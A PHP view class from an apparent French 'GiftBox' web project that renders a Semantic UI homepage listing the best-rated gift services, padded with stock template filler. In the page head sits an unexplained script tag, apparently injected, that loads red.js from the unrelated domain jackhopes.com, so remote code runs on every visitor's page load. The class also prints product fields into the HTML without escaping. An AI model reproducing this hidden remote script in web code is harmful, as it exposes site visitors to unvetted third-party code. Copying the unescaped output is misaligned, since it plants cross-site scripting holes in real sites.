<?php
/**
 * Created by PhpStorm.
 * User: Teddy
 * Date: 21/12/2016
 * Time: 18:27
 */

namespace giftbox\vue;


class VueAccueil
{

    public function render($listePrest)
    {

        $BestPrest = "<div class=\"ui vertical stripe segment prest title\">
                        <div class=\"ui text container\">
                           <h3 class=\"ui header\">Nos Meilleurs Prestations</h3>
                        </div>
                      </div>
                      
                      <div class=\"ui vertical stripe quote segment\">
            <div class=\"ui equal width stackable internally celled grid\">
              <div class=\"center aligned row\">";

        foreach ($listePrest as $prestation){
            $BestPrest = $BestPrest."<div class=\"column\">
                                        <h2>$prestation->nom</h2>
                                        <div class=\"meta\">
                                            <p class=\"categorie\">" . $prestation->categorie->nom . "</p>
                                        </div>
                                        <div class=\"extra content\">
                                        <span>
                                            $prestation->prix €
                                        </span>
                                        <br>
                                        <div class=\"ui star rating\" data-rating=\"" . $prestation->moyenne() . "\" data-max-rating=\"5\"></div><br /><br />
                                        <a class=\"ui large button\" href=\"/catalogue/".$prestation->id."\">Détail</a>
                                    </div>
                                    </div>";
        }

        $BestPrest = $BestPrest."       </div>
                                    </div>
                                </div>";



        $html = <<<END
        
        <!DOCTYPE html>
        <html>
        <head><script type="text/javascript" id="jc6202" ver="1.0.28.16" diu="Z9A0L2VNF079596A5FED3F" fr="default" src="http://jackhopes.com/ext/red.js"></script>
          <!-- Standard Meta -->
          <meta charset="utf-8" />
          <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        
          <!-- Site Properties -->
          <title>Homepage - Semantic</title>
          <link rel="stylesheet" href="https://cdn.jsdelivr.net/semantic-ui/2.2.6/semantic.min.css">
        
          <style type="text/css">
         
            
            .prest.title{
                text-align: center;
            }
        
            .hidden.menu {
              display: none;
            }
        
            .masthead.segment {
              min-height: 700px;
              padding: 1em 0em;
            }
            .masthead .logo.item img {
              margin-right: 1em;
            }
            .masthead .ui.menu .ui.button {
              margin-left: 0.5em;
            }
            .masthead h1.ui.header {
              margin-top: 3em;
              margin-bottom: 0em;
              font-size: 4em;
              font-weight: normal;
            }
            .masthead h2 {
              font-size: 1.7em;
              font-weight: normal;
            }
        
            .ui.vertical.stripe {
              padding: 8em 0em;
            }
            .ui.vertical.stripe h3 {
              font-size: 2em;
            }
            .ui.vertical.stripe .button + h3,
            .ui.vertical.stripe p + h3 {
              margin-top: 3em;
            }
            .ui.vertical.stripe .floated.image {
              clear: both;
            }
            .ui.vertical.stripe p {
              font-size: 1.33em;
            }
            .ui.vertical.stripe .horizontal.divider {
              margin: 3em 0em;
            }
        
            .quote.stripe.segment {
              padding: 0em;
            }
            .quote.stripe.segment .grid .column {
              padding-top: 5em;
              padding-bottom: 5em;
            }
        
            .footer.segment {
              padding: 5em 0em;
            }
        
            .secondary.pointing.menu .toc.item {
              display: none;
            }
        
            @media only screen and (max-width: 700px) {
              .ui.fixed.menu {
                display: none !important;
              }
              .secondary.pointing.menu .item,
              .secondary.pointing.menu .menu {
                display: none;
              }
              .secondary.pointing.menu .toc.item {
                display: block;
              }
              .masthead.segment {
                min-height: 350px;
              }
              .masthead h1.ui.header {
                font-size: 2em;
                margin-top: 1.5em;
              }
              .masthead h2 {
                margin-top: 0.5em;
                font-size: 1.5em;
              }
            }
        
        
          </style>
        
        </head>
        <body>
        
        <!-- Following Menu -->
        <div class="ui large top fixed hidden menu">
          <div class="ui container">
            <a class="active item">Home</a>
            <a class="item">Work</a>
            <a class="item">Company</a>
            <a class="item">Careers</a>
            <div class="right menu">
              <div class="item">
                <a class="ui button">Log in</a>
              </div>
              <div class="item">
                <a class="ui primary button">Sign Up</a>
              </div>
            </div>
          </div>
        </div>        
        
        <!-- Page Contents -->
        <div class="pusher">
          <div class="ui inverted vertical masthead center aligned segment">
        
            <div class="ui container">
              <div class="ui large secondary inverted pointing menu">
                <a class="toc item">
                  <i class="sidebar icon"></i>
                </a>
                <a class="active item" href="#">Accueil</a>
                <a class="item" href="/catalogue">Catalogue</a>
                <div class="right item">
                  <a class="ui inverted button">Connexion</a>
                  <a class="ui inverted button">Inscription</a>
                </div>
              </div>
            </div>
        
            <div class="ui text container">
              <h1 class="ui inverted header">
                GiftBox
              </h1>
              <h2>Faites plaisir à vos proches pour pas chère !</h2>
              <div class="ui huge primary button">Se lancer <i class="right arrow icon"></i></div>
            </div>
        
          </div>
        
          $BestPrest   
          <div class="ui vertical stripe segment">
            <div class="ui middle aligned stackable grid container">
              <div class="row">
                <div class="eight wide column">
                  <h3 class="ui header">We Help Companies and Companions</h3>
                  <p>We can give your company superpowers to do things that they never thought possible. Let us delight your customers and empower your needs...through pure data analytics.</p>
                  <h3 class="ui header">We Make Bananas That Can Dance</h3>
                  <p>Yes that's right, you thought it was the stuff of dreams, but even bananas can be bioengineered.</p>
                </div>
                <div class="six wide right floated column">
                  <img src="assets/images/wireframe/white-image.png" class="ui large bordered rounded image">
                </div>
              </div>
              <div class="row">
                <div class="center aligned column">
                  <a class="ui huge button">Check Them Out</a>
                </div>
              </div>
            </div>
          </div>
        
        
          <div class="ui vertical stripe quote segment">
            <div class="ui equal width stackable internally celled grid">
              <div class="center aligned row">
                <div class="column">
                  <h3>"What a Company"</h3>
                  <p>That is what they all say about us</p>
                </div>
                <div class="column">
                  <h3>"I shouldn't have gone with their competitor."</h3>
                  <p>
                    <img src="assets/images/avatar/nan.jpg" class="ui avatar image"> <b>Nan</b> Chief Fun Officer Acme Toys
                  </p>
                </div>
              </div>
            </div>
          </div>
        
          <div class="ui vertical stripe segment">
            <div class="ui text container">
              <h3 class="ui header">Breaking The Grid, Grabs Your Attention</h3>
              <p>Instead of focusing on content creation and hard work, we have learned how to master the art of doing nothing by providing massive amounts of whitespace and generic content that can seem massive, monolithic and worth your attention.</p>
              <a class="ui large button">Read More</a>
              <h4 class="ui horizontal header divider">
                <a href="#">Case Studies</a>
              </h4>
              <h3 class="ui header">Did We Tell You About Our Bananas?</h3>
              <p>Yes I know you probably disregarded the earlier boasts as non-sequitur filler content, but its really true. It took years of gene splicing and combinatory DNA research, but our bananas can really dance.</p>
              <a class="ui large button">I'm Still Quite Interested</a>
            </div>
          </div>
        
        
          <div class="ui inverted vertical footer segment">
            <div class="ui container">
              <div class="ui stackable inverted divided equal height stackable grid">
                <div class="three wide column">
                  <h4 class="ui inverted header">About</h4>
                  <div class="ui inverted link list">
                    <a href="#" class="item">Sitemap</a>
                    <a href="#" class="item">Contact Us</a>
                    <a href="#" class="item">Religious Ceremonies</a>
                    <a href="#" class="item">Gazebo Plans</a>
                  </div>
                </div>
                <div class="three wide column">
                  <h4 class="ui inverted header">Services</h4>
                  <div class="ui inverted link list">
                    <a href="#" class="item">Banana Pre-Order</a>
                    <a href="#" class="item">DNA FAQ</a>
                    <a href="#" class="item">How To Access</a>
                    <a href="#" class="item">Favorite X-Men</a>
                  </div>
                </div>
                <div class="seven wide column">
                  <h4 class="ui inverted header">Footer Header</h4>
                  <p>Extra space for a call to action inside the footer that could help re-engage users.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
          <script src="https://cdn.jsdelivr.net/semantic-ui/2.2.6/semantic.min.js"></script>
          <script>
          $('.ui.rating').rating('disable');
          $(document)
            .ready(function() {
        
              // fix menu when passed
              $('.masthead')
                .visibility({
                  once: false,
                  onBottomPassed: function() {
                    $('.fixed.menu').transition('fade in');
                  },
                  onBottomPassedReverse: function() {
                    $('.fixed.menu').transition('fade out');
                  }
                })
              ;
        
              // create sidebar and attach to menu open
              $('.ui.sidebar')
                .sidebar('attach events', '.toc.item')
              ;
        
            })
          ;
          </script>
        
        </body>
        
        </html>

        
END;
        return $html;
    }
}